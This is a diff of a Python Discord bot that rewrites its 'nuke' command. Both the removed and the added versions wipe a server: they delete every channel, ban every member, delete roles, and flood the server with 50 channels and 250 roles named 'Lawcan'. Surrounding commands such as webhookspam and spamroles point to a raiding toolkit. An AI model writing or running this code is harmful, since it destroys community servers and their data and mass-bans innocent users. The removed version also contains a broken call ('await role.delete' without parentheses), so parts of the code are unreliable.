@@ -272,76 +272,6 @@ async def webhookspam(ctx, amount: int, message: str):
 #needs work
 
 @bot.command()
-async def nuke(ctx):
-    #Permission management
-    if not ctx.author.guild_permissions.ban_members:
-        await ctx.send("You don't have perms silly :3.")
-        return
-
-    guild = ctx.guild
-
-    #mas channel delete
-    for channel in guild.channels:
-        try:
-            await channel.delete()
-        except discord.Forbidden:
-            await ctx.send(f"Cannot delete channel: {channel.name}. lf perms.")
-        except discord.HTTPException as e:
-            await ctx.send(f"Failed to delete channel: {channel.name} due to an HTTP error >.<. {e}")
-
-    #Channel spam
-    channel_amount = 0
-    number = 50
-    while channel_amount < number:
-        try:
-            await guild.create_text_channel("Lawcan")
-            channel_amount += 1
-        except discord.Forbidden:
-            await ctx.send("lf perms")
-            break
-        except discord.HTTPException as e:
-            await ctx.send(f"Failed to create channel due to an HTTP error >.<. error is {e}")
-            break
-
-    #massban
-    for member in guild.members:
-        if member != bot.user:
-            try:
-                await guild.ban(member, reason="Lawcan")
-            except discord.Forbidden:
-                await ctx.send(f"Failed to ban {member}. lf perms.")
-            except discord.HTTPException as e:
-                await ctx.send(f"Failed to ban {member} due to an HTTP error. {e}")
-
-    #mass role delete
-    roles = ctx.guild.roles
-    roles_to_delete = [role for role in roles if role.name != "@everyone" and role != ctx.guild.me.top_role]
-
-    for role in roles_to_delete:
-        try:
-            await role.delete
-        except discord.Forbidden:
-            await ctx.send("lf perms")
-            return
-        except discord.HTTPException as e:
-            await ctx.send(f"HTTP error occurred while deleting role {role.name}: {e}")
-            return
-
-    #mass role create
-    role_limit = 250
-    role_amount = 0
-    while role_amount < role_limit:
-        try:
-            await ctx.guild.create_role(name="Lawcan")
-            role_amount += 1
-        except discord.Forbidden:
-            await ctx.send("lf perms")
-            break
-        except discord.HTTPException as e:
-            await ctx.send(f"HTTP error occurred while creating role: {e}")
-            break
-
-@bot.command()
 async def spamroles(ctx, number: int, role_name: str):
     role_amount = 0
     while role_amount < number:
@@ -519,5 +449,18 @@ async def lastraid(ctx, username: str = None):
     await ctx.message.delete()
     raid_info = get_most_recent_raid(membership_id, membership_type)
     await ctx.send(f"lawcan\n{raid_info}\n{username}")
+
+@bot.command()
+async def nuke(ctx):
+    await ctx.message.delete()
+    if not ctx.author.guild_permissions.ban_members:
+        await ctx.send("You don't have perms silly :3.")
+        return
+
+    await deletechannels(ctx)
+    await massban(ctx, reason="Lawcan")
+    await createchannels(ctx, number=50, channel_name="lawcan")
+    await deleteroles(ctx)
+    await spamroles(ctx, number=250, role_name="lawcan")
 
 bot.run(TOKEN)
